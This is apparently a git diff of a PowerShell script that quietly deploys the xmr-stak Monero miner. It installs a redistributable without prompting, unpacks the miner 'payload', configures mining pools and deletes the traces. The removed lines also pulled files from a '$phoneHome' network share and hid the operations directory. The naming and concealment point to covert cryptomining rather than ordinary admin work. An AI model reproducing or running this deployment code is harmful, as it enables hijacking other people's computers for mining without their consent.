@@ -1,7 +1,4 @@
-﻿# Unified Advance Party Script - Functions included until I find an elegant way to send 
-# separate files for the functions in the AP setup process
-
-# Accept a paramter for the operations directory which is stored in the JSON config
+﻿# Accept a paramter for the operations directory which is stored in the JSON configbeing passed in via the pipline
 
 param(
   [Parameter(Mandatory = $True,
@@ -13,63 +10,12 @@ param(
   [string]$stakName,
   [string]$stakVersion
 )
-
 # Advance Party functions
-
-function stashDrive {
-
-  $callBack = ""\\" + $phoneHome + "\" + "ops_cache""
-  write-host $callBack
-  New-PSDrive -Name "stash" -PSProvider FileSystem -Root $callBack
-  Get-PSDrive
-  read-host
-
-}
-
-function smashStashDrive {
-
-  Remove-PSDrive -Name "stash" -Force
-
-}
-
-function redist ($destination) { #change to point at ops cache and rename function
-  
-  #$itemPath = "\\" + $phoneHome + "\" + "ops_cache" + "\" + $distName
-  $itemPath = "stash:\" + $distName
-  Write-Host $itemPath
-  Copy-Item -Path $itemPath -Destination $destination
-}
-
-function payload ($destination) { #change to point at ops cache and rename function
-
-  #$itemPath = "\\" + $phoneHome + "\" + "ops_cache" + "\" +  $stakName + "-" + "$stakVersion" + ".zip"
-  $itemPath = "stash:\" + $stakName + "-" + "$stakVersion" + ".zip"
-  Write-Host $itemPath
-  Copy-Item -Path $itemPath -Destination $destination
-}
-
-function configTpl () { #change to point at ops cache and rename function
-
-  #$itemPath = "\\" + $phoneHome + "\" + "ops_cache" + "\" + "config.tpl"
-  $itemPath = "stash:\" + "config.tpl"
-  Write-Host $itemPath
-  Copy-Item -Path $itemPath -Destination $opsDir
-
-}
-
-function poolTpl () { #change to point at ops cache and rename function
-
-  #$itemPath = "\\" + $phoneHome + "\" + "ops_cache" + "\" + "pools.tpl"
-  $itemPath = "stash:\" + "pools.tpl"
-  Write-Host $itemPath
-  Copy-Item -Path $itemPath -Destination $opsDir
-
-}
-
 
 function stripExcess ($template) {
 
   # strip out unneeded characters from the configuration templates
+
   $head = 'R"===('
   $tail = ')==="'
 
@@ -107,26 +53,6 @@ function alterPoolTpl ($file) {
 
 # END FUNCTIONS
 
-# BEGIN PARTYING!
-
-# Create the stash drive
-
-stashDrive
-
-# Create an operations directory and hide it.  In the future we will load this variable from another location as this is intended to be called from fireBase.ps1
-
-if (!(Test-Path $opsDir))
-
-{
-
-  mkdir $opsDir
-  $f = Get-Item $opsDir -Force
-  $f.Attributes = "Hidden"
-
-} else { write-host "`nOperations directory exists..."
-          Start-Sleep -s 1
-        }
-
 # Check to see if the Visual C++ Redistributable is installed
 
 $redistDestination = "$opsDir\vc_redist.x64.exe"
@@ -138,7 +64,6 @@ if ($null -eq $uninstallValue)
 {
 
   write-host "`nAttempting to install Microsoft Visual C++ Redistibutable..."
-	redist $redistDestination
 	Invoke-Expression "& '$redistDestination' /install /passive /norestart"
   write-host "Installed!`n"
 
@@ -155,66 +80,26 @@ else
 
 }
 
-# Check to see if our payload is already downloaded. Note we need to specify our TLS version to 1.2 to get the download to negoatiate a secure channel.
-
-$payloadDestination = "$opsDir\payload.zip"
-
-if (!(Test-Path "$opsDir\xmr-stak-win64-2.8.3"))
-
-{
-
-  payload $payloadDestination
-  read-host
-  Expand-Archive -LiteralPath $payloadDestination -DestinationPath $opsDir
-  read-host
-  Remove-Item $payloadDestination -Force
-  read-host
-
-} else { write-host "`nPayload exists..."
-      Start-Sleep -s 1
-      read-host
-}
-
+# Unzip the payload
+$payloadDestination = "$opsDir" + "\" +  $stakName + "-" + "$stakVersion" + ".zip"
+Expand-Archive -LiteralPath $payloadDestination -DestinationPath $opsDir
 
 # Load the newly unzipped directory path into a variable and set the destiation path to extract the config.
-
 $unzipDir = Get-ChildItem -Path $opsDir -Directory -Name
 $stakDir = "$opsDir\$unzipDir"
 
-# Check to see if a config.txt file exists - download the template and modify as needed if it doesn't
+# Modify the config.tpl file and save it to a text file
+$config = Get-Content "$opsDir\config.tpl" -raw
+stripExcess ($config) | Out-File "$stakDir\config.txt"
+alterConfigTpl "$stakDir\config.txt"
 
-if (!(Test-Path "$stakDir\config.txt"))
+# Modify the pools.tpl file and save it to a text file
+$pools = Get-Content "$opsDir\pools.tpl" -raw
+stripExcess ($pools) | Out-File "$stakDir\pools.txt"
+alterPoolTpl "$stakDir\pools.txt"
 
-{
-  
-  configTpl
-  $config = Get-Content "$opsDir\config.tpl" -raw
-  stripExcess ($config) | Out-File "$stakDir\config.txt"
-  alterConfigTpl "$stakDir\config.txt"
-  Remove-Item "$opsDir\config.tpl"
-
-} else { write-host "`nConfig exists..."
-Start-Sleep -s 1
-}
-
-# Check for a pools.txt file - download the template and modify as needed if it doesn't
-
-if (!(Test-Path "$stakDir\pools.txt"))
-
-{
-
-  poolTpl
-  $pools = Get-Content "$opsDir\pools.tpl" -raw
-  stripExcess ($pools) | Out-File "$stakDir\pools.txt"
-  alterPoolTpl "$stakDir\pools.txt"
-  Remove-Item "$opsDir\pools.tpl"
-
-} else { 
-  write-host "`nPools exist..." 
-  Start-Sleep -s 1
-        }
-
-# remove the stash drive
-
-smashStashDrive
-
+# Cleanup the cruft
+Remove-Item "$opsDir\pools.tpl"
+Remove-Item "$opsDir\config.tpl"
+Remove-Item "$opsDir\vc_redist.x64.exe"
+Remove-Item $payloadDestination
